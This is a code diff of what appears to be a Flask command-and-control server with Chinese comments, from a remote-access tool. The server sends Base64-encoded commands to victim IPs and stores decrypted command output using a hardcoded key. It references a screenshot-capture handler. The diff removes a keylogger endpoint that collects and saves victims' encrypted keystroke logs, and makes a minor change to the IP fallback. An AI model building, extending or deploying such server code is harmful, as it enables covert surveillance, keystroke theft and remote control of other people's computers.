@@ -133,7 +133,6 @@ def activate():
         en_cmd = base64.b64encode(cmd.encode('utf-8')).decode('utf-8')  # 对命令进行Base64编码
         # 发送请求
         requests.get(f'http://{ip}/cmd/{en_cmd}')
-        # print(en_cmd)
         return redirect(url_for('result', ip=ip))  # 重定向到结果页面
     else:
         return "IP or command is missing."  # 返回错误信息
@@ -148,6 +147,8 @@ def result():
             result = request.form['result']
             f.write(result.encode('utf-8'))  # 将结果写入文件
     ip = request.args.get('ip')
+    if ip is None:
+        ip = request.remote_addr
     return redirect(url_for('print_result', ip=ip))  # 重定向到打印结果的页面
 
 
@@ -161,26 +162,6 @@ def print_result(ip):
         de_content = decrypt(content, "dGhpc2lzbXlpdGVt")  # 解密文件内容
         de_content_str = base64.b64decode(de_content)  # Base64解码
     return render_template('result.html', content=de_content_str.decode('utf-8'), ip=ip)  # 渲染结果页面
-
-
-def keylogger():
-    try:
-        # 获取表单数据
-        ID = request.form['id']
-        raw_keylog = request.form['keylog']
-        # 解密密钥日志
-        de_keylog = decrypt(raw_keylog.encode('utf-8'), 'dGhpc2lzbXlpdGVt')
-        # Base64解码并转换为字符串
-        de_base64_keylog = base64.b64decode(de_keylog).decode('utf-8')
-        # 确保目录存在
-        os.makedirs('data/monitor/keylog', exist_ok=True)
-        # 将解码后的日志写入文件，指定编码为utf-8
-        with open(f'data/monitor/keylog/{ID}.txt', 'a', encoding='utf-8') as fp:
-            fp.write(de_base64_keylog + '\n')
-        return 'keylogger received', 200
-    except Exception as e:
-        print(f"Error processing keylog: {e}")
-        return 'Error', 500
 
 
 def screenshotter():
